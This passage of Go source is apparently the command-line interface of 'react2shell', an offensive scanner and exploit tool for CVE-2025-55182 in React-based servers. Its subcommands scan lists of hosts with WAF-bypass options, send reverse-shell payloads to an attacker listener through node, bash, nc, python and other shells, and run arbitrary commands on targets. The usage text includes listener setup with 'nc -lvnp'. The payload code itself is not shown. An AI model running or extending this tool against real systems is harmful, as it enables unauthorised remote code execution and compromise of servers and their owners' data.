	timeout := fs.Int("timeout", 10, "Timeout in seconds")
	threads := fs.Int("t", 10, "Concurrent threads")
	safeMode := fs.Bool("safe", false, "Safe detection (no code execution)")
	output := fs.String("o", "", "Output file for vulnerable hosts")
	jsonOut := fs.Bool("json", false, "JSON output")
	verbose := fs.Bool("v", false, "Verbose output")
	quiet := fs.Bool("q", false, "Quiet mode")
	maxMemory := fs.Int64("max-mem", 0, "Maximum memory in MB (0 = unlimited)")
	streamMode := fs.Bool("stream", false, "Stream mode - write results immediately, lower memory")
	wafBypass := fs.Bool("waf-bypass", false, "Add junk data to bypass WAF content inspection")
	wafBypassSize := fs.Int("waf-bypass-size", 128, "Size of junk data in KB for WAF bypass")
	vercelWAFBypass := fs.Bool("vercel-waf-bypass", false, "Use Vercel WAF bypass payload variant")
	fs.Parse(os.Args[2:])

	logger := NewLogger(*quiet, *jsonOut)

	if *target == "" && *listFile == "" {
		logger.Error("Specify target with -u or list with -l")
		fs.PrintDefaults()
		os.Exit(1)
	}

	var targets []string
	if *target != "" {
		targets = append(targets, *target)
	} else {
		var err error
		targets, err = loadTargets(*listFile)
		if err != nil {
			logger.Error("Failed to load targets: %v", err)
			os.Exit(1)
		}
	}

	if len(targets) == 0 {
		logger.Error("No valid targets")
		os.Exit(1)
	}

	actualTimeout := *timeout
	if *wafBypass && *timeout == 10 {
		actualTimeout = 20
	}

	config := &ScanConfig{
		Port:            *port,
		Path:            *path,
		Threads:         *threads,
		Timeout:         time.Duration(actualTimeout) * time.Second,
		SafeMode:        *safeMode,
		Insecure:        *insecure,
		UseTLS:          !*noTLS,
		Verbose:         *verbose,
		JSONOutput:      *jsonOut,
		Quiet:           *quiet,
		MaxMemoryMB:     *maxMemory,
		StreamMode:      *streamMode,
		WAFBypass:       *wafBypass,
		WAFBypassSizeKB: *wafBypassSize,
		VercelWAFBypass: *vercelWAFBypass,
	}

	runScan(targets, config, *output, logger)
}

func cmdExploit() {
	fs := flag.NewFlagSet("exploit", flag.ExitOnError)
	target := fs.String("u", "", "Target URL or IP")
	port := fs.Int("p", 443, "Target port")
	path := fs.String("path", "/", "Request path")
	noTLS := fs.Bool("no-tls", false, "Use HTTP")
	insecure := fs.Bool("k", true, "Skip TLS verification")
	timeout := fs.Int("timeout", 30, "Timeout in seconds")
	lhost := fs.String("lhost", "", "Listener IP")
	lport := fs.Int("lport", 4444, "Listener port")
	shell := fs.String("shell", "node", "Shell: node,bash,sh,nc,nc-e,python,python3,perl,ruby,php")
	verbose := fs.Bool("v", false, "Verbose output (show full request/response)")
	fs.Parse(os.Args[2:])

	logger := NewLogger(false, false)

	if *target == "" {
		logger.Error("Target required (-u)")
		os.Exit(1)
	}
	if *lhost == "" {
		logger.Error("Listener IP required (-lhost)")
		os.Exit(1)
	}

	logger.Warning("Start listener first: nc -lvnp %d", *lport)

	config := &ExploitConfig{
		Target:       *target,
		Port:         *port,
		Path:         *path,
		UseTLS:       !*noTLS,
		Insecure:     *insecure,
		Timeout:      time.Duration(*timeout) * time.Second,
		ListenerIP:   *lhost,
		ListenerPort: *lport,
		Shell:        *shell,
		Verbose:      *verbose,
	}

	if err := exploit(config, logger); err != nil {
		logger.Error("Exploit failed: %v", err)
		os.Exit(1)
	}
}

func cmdExec() {
	fs := flag.NewFlagSet("exec", flag.ExitOnError)
	target := fs.String("u", "", "Target URL or IP")
	port := fs.Int("p", 443, "Target port")
	path := fs.String("path", "/", "Request path")
	noTLS := fs.Bool("no-tls", false, "Use HTTP")
	insecure := fs.Bool("k", true, "Skip TLS verification")
	timeout := fs.Int("timeout", 30, "Timeout in seconds")
	command := fs.String("c", "", "Command to execute")
	verbose := fs.Bool("v", false, "Verbose output (show full request/response)")
	fs.Parse(os.Args[2:])

	logger := NewLogger(false, false)

	if *target == "" {
		logger.Error("Target required (-u)")
		os.Exit(1)
	}
	if *command == "" {
		logger.Error("Command required (-c)")
		os.Exit(1)
	}

	config := &ExecConfig{
		Target:   *target,
		Port:     *port,
		Path:     *path,
		UseTLS:   !*noTLS,
		Insecure: *insecure,
		Timeout:  time.Duration(*timeout) * time.Second,
		Command:  *command,
		Verbose:  *verbose,
	}

	if err := execCmd(config, logger); err != nil {
		logger.Error("Execution failed: %v", err)
		os.Exit(1)
	}
}

func printUsage() {
	fmt.Fprintf(os.Stderr, `react2shell v%s - React2Shell Scanner (CVE-2025-55182)

Usage:
  %s <command> [options]

Commands:
  scan      Scan targets for vulnerability
  exploit   Send reverse shell payload
  exec      Execute arbitrary command
  version   Show version
  help      Show this help

Scan Examples:
  %s scan -u example.com
  %s scan -l targets.txt -t 50 -o vuln.txt
  %s scan -l targets.txt -t 100 -max-mem 256 -stream
  %s scan -u 192.168.1.100 -p 3000 -no-tls -safe
  %s scan -u example.com -waf-bypass
  %s scan -u example.com -waf-bypass -waf-bypass-size 256
  %s scan -u example.com -vercel-waf-bypass

Exploit Examples:
  %s exploit -u example.com -lhost 10.0.0.5 -lport 4444
  %s exploit -u example.com -lhost 10.0.0.5 -lport 4444 -v
  %s exec -u example.com -c 'id'
  %s exec -u example.com -c 'id' -v

Scan Options:
  -u              Single target URL or IP
  -l              File with targets (one per line)
  -p              Target port (default: 443)
  -path           Request path (default: /)
  -no-tls         Use HTTP instead of HTTPS
  -k              Skip TLS verification (default: true)
  -timeout        Timeout in seconds (default: 10)
  -t              Concurrent threads (default: 10)
  -safe           Safe detection mode (no code execution)
  -o              Output file for vulnerable hosts
  -json           JSON output
  -v              Verbose output
  -q              Quiet mode
  -max-mem        Maximum memory in MB (0 = unlimited)
  -stream         Stream mode - minimal memory usage
  -waf-bypass     Add junk data to bypass WAF content inspection
  -waf-bypass-size Size of junk data in KB (default: 128)
  -vercel-waf-bypass Use Vercel WAF bypass payload variant

Exploit/Exec Options:
  -u              Target URL or IP
  -p              Target port (default: 443)
  -path           Request path (default: /)
  -no-tls         Use HTTP instead of HTTPS
  -k              Skip TLS verification (default: true)
  -timeout        Timeout in seconds (default: 30)
  -v              Verbose output (show full request/response)

Exploit-specific:
  -lhost          Listener IP address
  -lport          Listener port (default: 4444)
  -shell          Shell type: node,bash,sh,nc,nc-e,python,python3,perl,ruby,php

Exec-specific:
  -c              Command to execute

Run '%s <command> -h' for command-specific options.
`, Version, os.Args[0], os.Args[0], os.Args[0], os.Args[0], os.Args[0], os.Args[0], os.Args[0], os.Args[0], os.Args[0], os.Args[0], os.Args[0], os.Args[0], os.Args[0])
}

var _ = httputil.DumpRequest
